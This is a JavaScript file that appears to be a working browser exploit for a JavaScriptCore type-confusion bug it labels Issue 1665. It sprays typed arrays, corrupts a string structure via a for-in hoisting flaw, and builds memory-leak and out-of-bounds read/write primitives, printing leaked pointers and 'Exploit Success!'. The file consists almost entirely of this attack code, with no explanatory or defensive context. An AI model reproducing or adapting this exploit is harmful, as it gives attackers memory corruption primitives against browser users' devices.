// Variables for addrof&fakeobj
var leakObj = { a: 0 };
var leakArr = new Uint32Array(6);

// Variables for read/write
var oobSlave = new Uint8Array(1024);
var oobMaster = new Uint32Array(7);

// Other variables
const SPRAY_SIZE = 0x10000;
const g_spray = new Array(SPRAY_SIZE);
var impl_idx = 0;

// Spray A bounch of Uint32Arrays
for (let i = 0; i < SPRAY_SIZE; i++) {
  const arr = new Uint32Array(1);
  arr[i + "spray"] = 123;
  g_spray[i] = arr;
}

// Prepare element that will contain debug text
privDebugElement = document.createElement("p");
privDebugElement.setAttribute("id", "infc");

// Custom function that prints the formatted string onto the page
function printf(...args) {
  const output = args
    .map((arg) => {
      return ((typeof arg === "object" ? JSON.stringify(arg) : arg.toString()) + " ");
    }).join(" ");
  // Append formatted string into paragraph element, then set new line using <br> element
  privDebugElement.innerHTML += output + "<br>";
}

// Print the number of arrays sprayed
printf(g_spray.length, "Uint32Arrays Sprayed");

// The target object structure
var target = {
  a: 2.1100820415101592e-303, // small point float property
  b: false, // boolean property
  c: true, // boolean property
  d: 5678, // integer property
};

// Create another target object for crashing purposes
var target2 = { a: 2.1100820415101592e-303, b: false, c: true, e: 5678 };

// Type-confused with WTF::StringImpl
function create_impl() {
  // The property (a) is type-confused with WTF::StringImplShape::m_hashAndFlags
  const ans = { a: target };
  for (let i = 0; i < 32; i++, impl_idx++) {
    ans[impl_idx + "x"] = {};
  }
  return ans;
}

// Convert a number to a hexadecimal string
function hexNum(input) {
  return "0x" + Number(input).toString(16);
}

// Issue 1665: WebKit: JSC: BytecodeGenerator::hoistSloppyModeFunctionIfNecessary doesn't invalidate the ForInContext object.
function trigger(x) {
  if (impl.a != target) {
    console.log("wtf?");
    while (1);
  }

  // Property (a) is type-confused with WTF::String::m_impl
  var o = { a: 1 };

  // Iterate over the properties of 'o'
  for (var i in o) {
    // Redefine the iteration variable 'i' to the value of 'x'
    // This will cause the property name to be type-confused with a string object without any
    // check in the op_get_direct_pname handler
    {
      i = x;
      function i() {}
    }
    // This sets bit 4 (|= 16) in WTF::StringImplShape::m_hashAndFlags
    o[i];
  }
  if (impl.a != target) {
    printf("Corrupted!");
    printf("impl Variable Information",
      "<br> impl type: ", typeof impl,
      "<br> property (a) length:", impl.a.length,
      "<br> property (a) type: ", typeof impl.a
    );
    target.c = leakObj;
    leakObj.a = leakObj;
    var l1 = impl.a[4], l2 = impl.a[5];
    leakObj.a = oobSlave;
    var s1 = impl.a[4], s2 = impl.a[5];
    target.c = leakArr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oobMaster;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    printf("leaked information",
      "<br> l1:", hexNum(l1),
      "<br> l2:", hexNum(l2),
      "<br> s1:", hexNum(s1),
      "<br> s2:", hexNum(s2)
    );
    throw "Exploit Success!";
  }
}
try {
  for (var _ = 0; _ < 1024; _++) {
    //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
    var impl = create_impl();
    var s = { a: impl };
    trigger(s);
  }
} catch (e) {
  printf(e);
}
